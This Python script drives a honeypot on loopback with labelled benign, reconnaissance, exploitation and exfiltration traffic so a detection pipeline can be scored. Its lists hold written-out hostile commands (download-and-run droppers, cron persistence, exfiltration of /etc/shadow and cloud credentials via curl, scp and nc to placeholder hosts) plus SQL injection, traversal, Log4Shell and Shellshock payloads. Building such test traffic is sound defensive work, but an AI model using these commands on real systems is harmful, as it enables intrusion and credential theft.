"""Drive a throwaway engine with labelled, controlled traffic.

The analysis pipeline has only ever been scored on other people's data. Until
the decoys see real attackers, the nearest honest thing is traffic whose class
is known because of how it was made: a banner grab is benign, a version scan
is reconnaissance, a download-and-run sequence is exploitation. This script
produces that traffic against an engine on loopback and writes down which
scenario ran when, so ``collect.py`` can attach the labels afterwards.

It is controlled test traffic. Nothing here is an attack on anyone: every
target is 127.0.0.1, and the addresses inside the commands are from the
documentation ranges (198.51.100.0/24, 203.0.113.0/24), which are not routed.

    python -m tools.controlled_traffic.generate --manifest run/manifest.jsonl \
        --ssh 42222 --telnet 42323 --ftp 42121 --http 48080 --rounds 6

Scenarios run one at a time with a pause between them, because labels are
attached by time window. External tools (nmap, sqlmap) are used when they are
installed and skipped, with a note in the manifest, when they are not.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import random
import shutil
import socket
import subprocess
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

HOST = "127.0.0.1"
BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"

#: What each label means here. The definitions are fixed before any traffic is
#: generated and are recorded in the manifest, so the labels can be argued
#: with rather than taken on trust.
LABEL_DEFINITIONS = {
    "benign": "Connects and leaves, mistypes one login, or browses ordinary pages. No attack behaviour.",
    "reconnaissance": "Finds out what is there without changing anything: version scans, path enumeration, system enumeration after login.",
    "exploitation": "Tries to gain or keep access: password guessing runs, injection and traversal requests, download-and-run, persistence.",
    "exfiltration": "Reads sensitive files and sends them to another host.",
}

ENUMERATION = [
    "uname -a", "id", "whoami", "cat /proc/cpuinfo", "free -m", "df -h", "ps aux",
    "cat /etc/passwd", "w", "uptime", "ls -la /tmp", "cat /etc/os-release", "ifconfig", "netstat -tlnp",
]
DROPPERS = [
    ["cd /tmp", "wget http://198.51.100.23/bins.sh -O bins.sh", "chmod +x bins.sh", "sh bins.sh"],
    ["curl -s http://203.0.113.40/x.sh | sh"],
    ["cd /var/tmp; wget http://198.51.100.77/a -O .a; chmod 777 .a; ./.a"],
    ["busybox wget http://203.0.113.9/arm7 -O /tmp/arm7", "chmod +x /tmp/arm7", "/tmp/arm7 telnet"],
]
PERSISTENCE = [
    ["mkdir -p ~/.ssh", "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 test@controlled' >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys"],
    ["echo '*/5 * * * * curl -s http://198.51.100.23/c.sh | sh' > /tmp/c", "crontab /tmp/c"],
]
EXFILTRATION = [
    ["cat /etc/shadow", "tar czf /tmp/e.tgz /etc/passwd /etc/shadow", "scp /tmp/e.tgz backup@203.0.113.50:/srv/in/"],
    ["cat ~/.aws/credentials", "curl -s -F f=@/root/.aws/credentials http://198.51.100.60/up"],
    ["tar czf - /home /etc/shadow | nc 203.0.113.50 4444"],
]
ADMIN_PATHS = [
    "/admin", "/wp-login.php", "/phpmyadmin/", "/.git/config", "/server-status", "/manager/html",
    "/.env", "/backup.zip", "/config.php.bak", "/actuator/health", "/api/v1/users", "/cgi-bin/test.cgi",
]
WEB_ATTACKS = [
    ("GET", "/product?id=1%27%20OR%20%271%27=%271", {}),
    ("GET", "/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", {}),
    ("GET", "/download?file=../../../../etc/passwd", {}),
    ("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", {}),
    ("GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", {}),
    ("GET", "/", {"X-Api-Version": "${jndi:ldap://198.51.100.7/a}"}),
    ("GET", "/cgi-bin/status", {"User-Agent": "() { :; }; /bin/cat /etc/passwd"}),
]
GUESSES = ["123456", "password", "admin", "root123", "toor", "qwerty", "letmein", "raspberry", "ubnt", "1234"]


@dataclass
class Run:
    args: argparse.Namespace
    manifest: Path
    rng: random.Random
    credential: tuple[str, str] | None = None
    notes: list[str] = field(default_factory=list)

    def record(self, scenario: str, label: str, protocols: list[str], started: float, **extra) -> None:
        row = {"scenario": scenario, "label": label, "protocols": protocols,
               "started": started, "ended": time.time(), **extra}
        with self.manifest.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row) + "\n")
        # Sessions are told apart by when they started, so the next scenario
        # must not begin until this one's sessions have closed.
        time.sleep(self.args.gap)


# --- small clients ---------------------------------------------------------

def tcp_exchange(port: int, send: list[bytes] = (), wait: float = 1.0) -> bytes:
    """Open, optionally send lines, read what arrives for a moment, close."""
    data = b""
    with socket.create_connection((HOST, port), timeout=5) as sock:
        sock.settimeout(wait)
        try:
            data += sock.recv(4096)
            for line in send:
                sock.sendall(line)
                data += sock.recv(4096)
        except (socket.timeout, ConnectionError):
            pass
    return data


def http(port: int, method: str, path: str, headers: dict | None = None, agent: str = BROWSER_UA) -> int:
    request = urllib.request.Request(f"http://{HOST}:{port}{path}", method=method)
    request.add_header("User-Agent", agent)
    for name, value in (headers or {}).items():
        request.add_header(name, value)  # a header given here replaces the default
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            response.read(2048)
            return response.status
    except urllib.error.HTTPError as error:
        return error.code
    except (urllib.error.URLError, ConnectionError, TimeoutError):
        return 0


async def ssh_session(port: int, username: str, password: str, commands: list[str]) -> bool:
    """One interactive shell session. False when the login was refused."""
    import asyncssh

    try:
        async with asyncssh.connect(
            HOST, port, username=username, password=password, known_hosts=None,
            client_keys=None, connect_timeout=10, login_timeout=10,
        ) as connection:
            process = await connection.create_process(term_type="xterm")
            for command in commands:
                process.stdin.write(command + "\n")
                await asyncio.sleep(0.4)
            process.stdin.write("exit\n")
            try:
                await asyncio.wait_for(process.wait_closed(), 5)
            except asyncio.TimeoutError:
                pass
        return True
    except asyncssh.PermissionDenied:
        return False
    except (OSError, asyncssh.Error, asyncio.TimeoutError):
        return False


async def find_credential(port: int) -> tuple[str, str] | None:
    """A login the decoy accepts, found before any labelled scenario runs."""
    for candidate in (("root", "root"), ("admin", "admin"), ("root", "123456"), ("root", "password"), ("ubuntu", "ubuntu")):
        if await ssh_session(port, *candidate, commands=[]):
            return candidate
        await asyncio.sleep(1)
    return None


# --- scenarios -------------------------------------------------------------

def benign(run: Run) -> None:
    a = run.args
    if a.ssh:
        t = time.time()
        tcp_exchange(a.ssh)
        run.record("ssh-banner-grab", "benign", ["ssh"], t)
    if a.telnet:
        t = time.time()
        tcp_exchange(a.telnet)
        run.record("telnet-connect", "benign", ["telnet"], t)
    if a.ftp:
        t = time.time()
        tcp_exchange(a.ftp, [b"QUIT\r\n"])
        run.record("ftp-connect-quit", "benign", ["ftp"], t)
    if a.http:
        t = time.time()
        agent = f"{BROWSER_UA} ct/{run.rng.randrange(10**6)}"  # a distinct visitor each time
        for path in ("/", "/favicon.ico", "/robots.txt"):
            http(a.http, "GET", path, agent=agent)
        run.record("http-browse", "benign", ["http"], t)
    if a.ssh:
        t = time.time()
        asyncio.run(ssh_session(a.ssh, "deploy", "Tuesday-typo", commands=[]))
        run.record("ssh-one-mistyped-login", "benign", ["ssh"], t)


def reconnaissance(run: Run) -> None:
    a = run.args
    if a.ssh and run.credential:
        t = time.time()
        commands = run.rng.sample(ENUMERATION, k=run.rng.randint(5, 9))
        asyncio.run(ssh_session(a.ssh, *run.credential, commands=commands))
        run.record("ssh-enumeration", "reconnaissance", ["ssh"], t, commands=len(commands))
    if a.http:
        t = time.time()
        agent = f"curl/8.{run.rng.randint(1, 15)}.0"
        for path in run.rng.sample(ADMIN_PATHS, k=8):
            http(a.http, "GET", path, agent=agent)
        run.record("http-path-enumeration", "reconnaissance", ["http"], t)


def exploitation(run: Run) -> None:
    a = run.args
    if a.ssh and run.credential:
        t = time.time()
        commands = run.rng.sample(ENUMERATION, k=2) + run.rng.choice(DROPPERS)
        asyncio.run(ssh_session(a.ssh, *run.credential, commands=commands))
        run.record("ssh-download-and-run", "exploitation", ["ssh"], t)

        t = time.time()
        asyncio.run(ssh_session(a.ssh, *run.credential, commands=run.rng.choice(PERSISTENCE)))
        run.record("ssh-persistence", "exploitation", ["ssh"], t)
    if a.ssh:
        t = time.time()

        async def guess(passwords: list[str]) -> None:
            import asyncssh

            class Guesser(asyncssh.SSHClient):
                """Offers the next password each time the server asks again."""

                def password_auth_requested(self):
                    return passwords.pop(0) if passwords else None

            try:
                connection, _ = await asyncssh.create_connection(
                    Guesser, HOST, a.ssh, username="root", known_hosts=None,
                    client_keys=None, preferred_auth="password", login_timeout=20,
                )
                connection.close()
            except (OSError, asyncssh.Error, asyncio.TimeoutError):
                pass

        # Two connections, each trying several passwords until the server
        # hangs up or lets it in: what a guessing tool does.
        for _ in range(2):
            asyncio.run(guess(run.rng.sample(GUESSES, k=6)))
        run.record("ssh-password-guessing", "exploitation", ["ssh"], t, note="two connections, up to six passwords each")
    if a.http:
        t = time.time()
        agent = f"python-requests/2.{run.rng.randint(25, 32)}.0"
        for method, path, headers in run.rng.sample(WEB_ATTACKS, k=4):
            http(a.http, method, path, headers=headers, agent=headers.get("User-Agent", agent))
        run.record("http-injection-requests", "exploitation", ["http"], t)


def exfiltration(run: Run) -> None:
    a = run.args
    if a.ssh and run.credential:
        t = time.time()
        asyncio.run(ssh_session(a.ssh, *run.credential, commands=run.rng.choice(EXFILTRATION)))
        run.record("ssh-read-and-send", "exfiltration", ["ssh"], t)


def tools(run: Run) -> None:
    """Traffic nobody on the team wrote: real scanners, where installed."""
    a = run.args
    ports = [str(p) for p in (a.ssh, a.telnet, a.ftp, a.http) if p]
    nmap = shutil.which("nmap")
    if nmap and ports:
        t = time.time()
        subprocess.run([nmap, "-Pn", "-sV", "--version-light", "-p", ",".join(ports), HOST],
                       capture_output=True, timeout=240, check=False)
        run.record("nmap-version-scan", "reconnaissance",
                   [n for n, p in (("ssh", a.ssh), ("telnet", a.telnet), ("ftp", a.ftp), ("http", a.http)) if p], t, tool="nmap -sV")
        if a.http:
            t = time.time()
            # -sV as well: on a non-standard port the script only runs once
            # the service has been identified as HTTP.
            subprocess.run([nmap, "-Pn", "-sV", "-p", str(a.http), "--script", "http-enum", HOST],
                           capture_output=True, timeout=300, check=False)
            run.record("nmap-http-enum", "reconnaissance", ["http"], t, tool="nmap -sV --script http-enum")
    else:
        run.notes.append("nmap not installed: version-scan scenarios skipped")
    sqlmap = shutil.which("sqlmap")
    command = [sqlmap] if sqlmap else (["uvx", "sqlmap"] if shutil.which("uvx") and a.fetch_tools else None)
    if command and a.http:
        t = time.time()
        subprocess.run(command + ["-u", f"http://{HOST}:{a.http}/product?id=1", "--batch", "--level", "1",
                                  "--risk", "1", "--threads", "1", "--timeout", "5", "--retries", "0",
                                  "--technique", "BEU", "--flush-session", "--disable-coloring"],
                       capture_output=True, timeout=420, check=False)
        run.record("sqlmap-default-run", "exploitation", ["http"], t, tool="sqlmap --level 1 --risk 1")
    else:
        run.notes.append("sqlmap not available: its scenario skipped")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--manifest", required=True, type=Path)
    for name in ("ssh", "telnet", "ftp", "http"):
        parser.add_argument(f"--{name}", type=int, default=0, help=f"engine {name} port on loopback (0 = skip)")
    parser.add_argument("--rounds", type=int, default=6, help="times each scripted scenario is run")
    parser.add_argument("--gap", type=float, default=4.0, help="seconds between scenarios; must exceed the engine's HTTP idle window")
    parser.add_argument("--seed", type=int, default=20261110)
    parser.add_argument("--fetch-tools", action="store_true", help="allow `uvx sqlmap` when sqlmap is not installed")
    args = parser.parse_args()

    args.manifest.parent.mkdir(parents=True, exist_ok=True)
    run = Run(args=args, manifest=args.manifest, rng=random.Random(args.seed))
    with args.manifest.open("w", encoding="utf-8") as handle:
        handle.write(json.dumps({"header": True, "seed": args.seed, "rounds": args.rounds, "gap": args.gap,
                                 "target": HOST, "labels": LABEL_DEFINITIONS, "started": time.time()}) + "\n")

    if args.ssh:
        run.credential = asyncio.run(find_credential(args.ssh))
        if run.credential is None:
            run.notes.append("no accepted SSH login found: shell scenarios skipped")
        time.sleep(args.gap)  # the probing logins above belong to no scenario
    preflight_ended = time.time()

    for _ in range(args.rounds):
        for scenario in (benign, reconnaissance, exploitation, exfiltration):
            scenario(run)
    tools(run)

    with args.manifest.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps({"footer": True, "preflight_ended": preflight_ended,
                                 "ended": time.time(), "notes": run.notes}) + "\n")
    print(f"manifest written to {args.manifest}; notes: {run.notes or 'none'}")


if __name__ == "__main__":
    main()
